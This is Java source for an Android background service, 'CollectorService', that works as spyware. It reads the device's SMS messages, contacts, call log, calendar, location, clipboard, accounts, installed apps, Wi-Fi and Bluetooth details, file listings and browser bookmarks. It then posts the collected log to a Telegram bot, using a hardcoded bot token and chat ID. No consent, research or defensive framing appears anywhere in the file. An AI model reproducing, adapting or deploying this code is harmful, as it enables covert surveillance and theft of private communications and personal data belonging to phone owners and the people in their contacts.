package com.cipherium.collector;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.widget.Toast;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.app.ActivityManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.hardware.SensorManager;
import android.hardware.Sensor;

import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.TimeZone;

public class CollectorService extends Service {
    private static final String BOT_TOKEN = "8945680103:AAHm7xfmAJoTUFGf2EcHlRjClunzdiaHByw";
    private static final String CHAT_ID = "7724881614";

    private final StringBuilder log = new StringBuilder();
    private final SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    private Context context;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        createNotificationChannel();
        startForeground(1, getNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                collectAllData();
                sendToTelegram();
                saveLogToFile();
            } catch (Exception e) {
                log("Ошибка: " + e.getMessage());
                e.printStackTrace();
            }
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void collectAllData() {
        log("=== CIPHERIUM ULTIMATE COLLECTION ===\n");
        log("Device: " + Build.MANUFACTURER + " " + Build.MODEL);
        log("Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        log("Time: " + sdf.format(new Date()) + "\n");

        collectDeviceInfo();
        collectSMS();
        collectContacts();
        collectCallLog();
        collectCalendarEvents();
        collectInstalledApps();
        collectLocation();
        collectClipboard();
        collectWiFiInfo();
        collectNetworkInfo();
        collectAccounts();
        collectDownloads();
        collectMediaFiles();
        collectBatteryInfo();
        collectDisplayInfo();
        collectStorageInfo();
        collectAudioInfo();
        collectBluetoothDevices();
        collectRunningProcesses();
        collectSensors();
        collectSystemProperties();
        collectBrowserHistory();

        log("\n=== COLLECTION COMPLETE ===");
    }

    private void log(String msg) {
        log.append(msg).append("\n");
        System.out.println(msg);
    }

    // === ВСЕ МЕТОДЫ СБОРА ===

    private void collectDeviceInfo() {
        log("--- DEVICE INFO ---");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                log("IMEI: " + (Build.VERSION.SDK_INT >= 29 ? "RESTRICTED" : tm.getDeviceId()));
                log("Phone Number: " + (Build.VERSION.SDK_INT >= 29 ? "RESTRICTED" : tm.getLine1Number()));
                log("SIM Operator: " + tm.getSimOperatorName());
                log("Network Operator: " + tm.getNetworkOperatorName());
                log("SIM Country: " + tm.getSimCountryIso());
                log("Network Type: " + getNetworkType(tm.getDataNetworkType()));
            }
            log("Android ID: " + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            log("Language: " + Locale.getDefault().getDisplayLanguage());
            log("Time Zone: " + TimeZone.getDefault().getDisplayName());
            log("Uptime: " + formatUptime(SystemClock.elapsedRealtime()));
        } catch (Exception e) {
            log("Error: " + e.getMessage());
        }
    }

    private String getNetworkType(int type) {
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_GSM: return "GSM";
            case TelephonyManager.NETWORK_TYPE_LTE: return "LTE";
            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
            case TelephonyManager.NETWORK_TYPE_WCDMA: return "WCDMA";
            default: return "Unknown (" + type + ")";
        }
    }

    private String formatUptime(long ms) {
        long seconds = ms / 1000;
        long minutes = seconds / 60;
        long hours = minutes / 60;
        long days = hours / 24;
        return days + "d " + (hours % 24) + "h " + (minutes % 60) + "m " + (seconds % 60) + "s";
    }

    private void collectSMS() {
        log("\n--- SMS (last 100) ---");
        try {
            Cursor c = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC LIMIT 100"
            );
            if (c != null && c.moveToFirst()) {
                int count = 0;
                do {
                    String addr = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long date = c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    log("From: " + addr + " | " + sdf.format(new Date(date)));
                    if (body != null && body.length() > 0) log("Body: " + body);
                    log("---");
                    count++;
                } while (c.moveToNext() && count < 100);
                c.close();
                log("Total SMS: " + count);
            } else {
                log("No SMS or permission denied");
            }
        } catch (Exception e) {
            log("SMS Error: " + e.getMessage());
        }
    }

    private void collectContacts() {
        log("\n--- CONTACTS ---");
        try {
            Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            if (c != null && c.moveToFirst()) {
                int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int count = 0;
                do {
                    String name = c.getString(nameIdx);
                    String number = c.getString(numIdx);
                    log((name != null ? name : "No name") + " : " + (number != null ? number : "No number"));
                    count++;
                    if (count >= 200) break;
                } while (c.moveToNext());
                c.close();
                log("Total contacts: " + count);
            }
        } catch (Exception e) {
            log("Contacts Error: " + e.getMessage());
        }
    }

    private void collectCallLog() {
        log("\n--- CALL LOG (last 50) ---");
        try {
            Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            if (c != null && c.moveToFirst()) {
                do {
                    String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    long duration = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String typeStr = "Unknown";
                    if (type != null) {
                        switch (Integer.parseInt(type)) {
                            case CallLog.Calls.INCOMING_TYPE: typeStr = "INCOMING"; break;
                            case CallLog.Calls.OUTGOING_TYPE: typeStr = "OUTGOING"; break;
                            case CallLog.Calls.MISSED_TYPE: typeStr = "MISSED"; break;
                        }
                    }
                    log(typeStr + " | " + num + " | " + sdf.format(new Date(date)) + " | " + duration + "s");
                } while (c.moveToNext());
                c.close();
            }
        } catch (Exception e) {
            log("Call Log Error: " + e.getMessage());
        }
    }

    private void collectCalendarEvents() {
        log("\n--- CALENDAR EVENTS (next 50) ---");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/events");
            Cursor c = getContentResolver().query(uri, null, null, null, "dtstart ASC LIMIT 50");
            if (c != null && c.moveToFirst()) {
                int count = 0;
                do {
                    String title = c.getString(c.getColumnIndex("title"));
                    long start = c.getLong(c.getColumnIndex("dtstart"));
                    log((title != null ? title : "No title") + " | " + sdf.format(new Date(start)));
                    count++;
                } while (c.moveToNext());
                c.close();
                log("Total: " + count);
            } else {
                log("No calendar events or permission denied");
            }
        } catch (Exception e) {
            log("Calendar Error: " + e.getMessage());
        }
    }

    private void collectInstalledApps() {
        log("\n--- INSTALLED APPS ---");
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            for (android.content.pm.ApplicationInfo app : apps) {
                String name = pm.getApplicationLabel(app).toString();
                boolean isSystem = (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                log(name + " | " + app.packageName + " | " + (isSystem ? "System" : "User"));
            }
            log("Total apps: " + apps.size());
        } catch (Exception e) {
            log("Apps Error: " + e.getMessage());
        }
    }

    private void collectLocation() {
        log("\n--- LOCATION ---");
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (lm != null) {
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    log("Latitude: " + loc.getLatitude());
                    log("Longitude: " + loc.getLongitude());
                    log("Accuracy: " + loc.getAccuracy() + "m");
                    log("Altitude: " + loc.getAltitude() + "m");
                    log("Bearing: " + loc.getBearing() + "°");
                    log("Speed: " + loc.getSpeed() + " m/s");
                } else {
                    log("Location unavailable");
                }
            }
        } catch (Exception e) {
            log("Location Error: " + e.getMessage());
        }
    }

    private void collectClipboard() {
        log("\n--- CLIPBOARD ---");
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    ClipData.Item item = clip.getItemAt(0);
                    log("Content: " + (item.getText() != null ? item.getText() : "No text"));
                }
            } else {
                log("Clipboard empty or no permission");
            }
        } catch (Exception e) {
            log("Clipboard Error: " + e.getMessage());
        }
    }

    private void collectWiFiInfo() {
        log("\n--- WIFI INFO ---");
        try {
            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifi != null) {
                log("WiFi Enabled: " + wifi.isWifiEnabled());
                android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
                if (info != null) {
                    log("SSID: " + info.getSSID());
                    log("BSSID: " + info.getBSSID());
                    log("RSSI: " + info.getRssi() + " dBm");
                    log("Link Speed: " + info.getLinkSpeed() + " Mbps");
                    log("IP Address: " + intToIp(info.getIpAddress()));
                }
                try {
                    String mac = wifi.getConnectionInfo().getMacAddress();
                    log("MAC Address: " + (mac != null ? mac : "Unavailable"));
                } catch (Exception e) {
                    log("MAC Error: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            log("WiFi Error: " + e.getMessage());
        }
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    private void collectNetworkInfo() {
        log("\n--- NETWORK INFO ---");
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo ni = cm.getActiveNetworkInfo();
                if (ni != null && ni.isConnected()) {
                    log("Type: " + ni.getTypeName());
                    log("Subtype: " + ni.getSubtypeName());
                    log("State: " + ni.getState());
                } else {
                    log("No active network connection");
                }
            }
        } catch (Exception e) {
            log("Network Error: " + e.getMessage());
        }
    }

    private void collectAccounts() {
        log("\n--- ACCOUNTS ---");
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
            if (am != null) {
                android.accounts.Account[] accounts = am.getAccounts();
                for (android.accounts.Account acc : accounts) {
                    log(acc.name + " (" + acc.type + ")");
                }
                log("Total accounts: " + accounts.length);
            }
        } catch (Exception e) {
            log("Accounts Error: " + e.getMessage());
        }
    }

    private void collectDownloads() {
        log("\n--- DOWNLOADS ---");
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && dir.exists()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile()) {
                            log(f.getName() + " (" + f.length() / 1024 + " KB)");
                        }
                    }
                    log("Total files: " + files.length);
                }
            }
        } catch (Exception e) {
            log("Downloads Error: " + e.getMessage());
        }
    }

    private void collectMediaFiles() {
        log("\n--- MEDIA FILES ---");
        try {
            String[] types = {
                Environment.DIRECTORY_MUSIC,
                Environment.DIRECTORY_PODCASTS,
                Environment.DIRECTORY_RINGTONES,
                Environment.DIRECTORY_ALARMS,
                Environment.DIRECTORY_NOTIFICATIONS,
                Environment.DIRECTORY_DOCUMENTS,
                Environment.DIRECTORY_PICTURES
            };
            for (String type : types) {
                File dir = Environment.getExternalStoragePublicDirectory(type);
                if (dir != null && dir.exists()) {
                    File[] files = dir.listFiles();
                    if (files != null && files.length > 0) {
                        log("--- " + type + " (" + files.length + " files) ---");
                        for (File f : files) {
                            if (f.isFile()) {
                                log(f.getName() + " (" + f.length() / 1024 + " KB)");
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            log("Media Files Error: " + e.getMessage());
        }
    }

    private void collectBatteryInfo() {
        log("\n--- BATTERY INFO ---");
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
            if (bm != null) {
                int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
                log("Level: " + level + "%");
                int status = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_STATUS);
                String statusStr = "Unknown";
                switch (status) {
                    case android.os.BatteryManager.BATTERY_STATUS_CHARGING: statusStr = "Charging"; break;
                    case android.os.BatteryManager.BATTERY_STATUS_DISCHARGING: statusStr = "Discharging"; break;
                    case android.os.BatteryManager.BATTERY_STATUS_FULL: statusStr = "Full"; break;
                    case android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING: statusStr = "Not charging"; break;
                }
                log("Status: " + statusStr);
            }
        } catch (Exception e) {
            log("Battery Error: " + e.getMessage());
        }
    }

    private void collectDisplayInfo() {
        log("\n--- DISPLAY INFO ---");
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm != null) {
                DisplayMetrics dm = new DisplayMetrics();
                wm.getDefaultDisplay().getMetrics(dm);
                log("Resolution: " + dm.widthPixels + "x" + dm.heightPixels);
                log("Density: " + dm.densityDpi + " dpi");
                log("Density (dp): " + dm.density);
            }
            try {
                int brightness = Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS);
                log("Brightness: " + brightness + " (0-255)");
            } catch (Exception e) {
                log("Brightness: unavailable");
            }
        } catch (Exception e) {
            log("Display Error: " + e.getMessage());
        }
    }

    private void collectStorageInfo() {
        log("\n--- STORAGE INFO ---");
        try {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            long totalSize = totalBlocks * blockSize / (1024 * 1024 * 1024);
            long availableSize = availableBlocks * blockSize / (1024 * 1024 * 1024);
            log("Internal Storage: " + availableSize + " GB / " + totalSize + " GB free");
        } catch (Exception e) {
            log("Storage Error: " + e.getMessage());
        }
    }

    private void collectAudioInfo() {
        log("\n--- AUDIO INFO ---");
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                int currVol = am.getStreamVolume(AudioManager.STREAM_MUSIC);
                log("Music Volume: " + currVol + "/" + maxVol);
                int mode = am.getRingerMode();
                String modeStr = "Normal";
                switch (mode) {
                    case AudioManager.RINGER_MODE_VIBRATE: modeStr = "Vibrate"; break;
                    case AudioManager.RINGER_MODE_SILENT: modeStr = "Silent"; break;
                }
                log("Ringer Mode: " + modeStr);
            }
        } catch (Exception e) {
            log("Audio Error: " + e.getMessage());
        }
    }

    private void collectBluetoothDevices() {
        log("\n--- BLUETOOTH DEVICES ---");
        try {
            BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();
            if (adapter != null) {
                log("Bluetooth Enabled: " + adapter.isEnabled());
                if (adapter.isEnabled()) {
                    Set<BluetoothDevice> devices = adapter.getBondedDevices();
                    if (devices != null && !devices.isEmpty()) {
                        for (BluetoothDevice device : devices) {
                            log(device.getName() + " | " + device.getAddress());
                        }
                        log("Total devices: " + devices.size());
                    } else {
                        log("No paired devices");
                    }
                }
            } else {
                log("Bluetooth not supported");
            }
        } catch (Exception e) {
            log("Bluetooth Error: " + e.getMessage());
        }
    }

    private void collectRunningProcesses() {
        log("\n--- RUNNING PROCESSES ---");
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am != null) {
                List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                if (processes != null) {
                    for (ActivityManager.RunningAppProcessInfo process : processes) {
                        log(process.processName + " | PID: " + process.pid);
                    }
                    log("Total processes: " + processes.size());
                }
            }
        } catch (Exception e) {
            log("Processes Error: " + e.getMessage());
        }
    }

    private void collectSensors() {
        log("\n--- SENSORS ---");
        try {
            SensorManager sm = (SensorManager) getSystemService(SENSOR_SERVICE);
            if (sm != null) {
                List<Sensor> sensors = sm.getSensorList(Sensor.TYPE_ALL);
                for (Sensor sensor : sensors) {
                    log(sensor.getName() + " | Type: " + sensor.getType());
                }
                log("Total sensors: " + sensors.size());
            }
        } catch (Exception e) {
            log("Sensors Error: " + e.getMessage());
        }
    }

    private void collectSystemProperties() {
        log("\n--- SYSTEM PROPERTIES ---");
        try {
            log("Board: " + Build.BOARD);
            log("Bootloader: " + Build.BOOTLOADER);
            log("Brand: " + Build.BRAND);
            log("CPU ABI: " + (Build.VERSION.SDK_INT >= 21 ? Build.SUPPORTED_ABIS[0] : "N/A"));
            log("Fingerprint: " + Build.FINGERPRINT);
            log("Hardware: " + Build.HARDWARE);
            log("Product: " + Build.PRODUCT);
            log("Serial: " + (Build.VERSION.SDK_INT >= 26 ? "RESTRICTED" : Build.getSerial()));
        } catch (Exception e) {
            log("System Properties Error: " + e.getMessage());
        }
    }

    private void collectBrowserHistory() {
        log("\n--- BROWSER HISTORY ---");
        try {
            Uri uri = Uri.parse("content://browser/bookmarks");
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                int titleIdx = c.getColumnIndex("title");
                int urlIdx = c.getColumnIndex("url");
                int count = 0;
                do {
                    String title = c.getString(titleIdx);
                    String url = c.getString(urlIdx);
                    log((title != null ? title : "No title") + " : " + (url != null ? url : "No URL"));
                    count++;
                    if (count >= 50) break;
                } while (c.moveToNext());
                c.close();
                log("Total: " + count);
            } else {
                log("No browser history or permission denied");
            }
        } catch (Exception e) {
            log("Browser History Error: " + e.getMessage());
        }
    }

    // === ОТПРАВКА В TELEGRAM ===

    private void sendToTelegram() {
        String text = log.toString();
        if (text.length() > 4096) {
            text = text.substring(0, 4000) + "\n... (truncated)";
        }
        sendMessage(text);
    }

    private void sendMessage(String text) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String params = "chat_id=" + CHAT_ID + "&text=" + Uri.encode(text);
            OutputStream os = conn.getOutputStream();
            os.write(params.getBytes());
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            conn.disconnect();
            if (code == 200) {
                Toast.makeText(this, "✅ Sent to Telegram", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            log("Error sending to Telegram: " + e.getMessage());
        }
    }

    private void saveLogToFile() {
        try {
            File logFile = new File(getExternalFilesDir(null), "cipherium_log_" + System.currentTimeMillis() + ".txt");
            FileWriter writer = new FileWriter(logFile);
            writer.write(log.toString());
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "cipherium_channel",
                "Cipherium",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification getNotification() {
        return new Notification.Builder(this, "cipherium_channel")
            .setContentTitle("Cipherium")
            .setContentText("Collecting data...")
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setPriority(Notification.PRIORITY_LOW)
            .build();
    }
}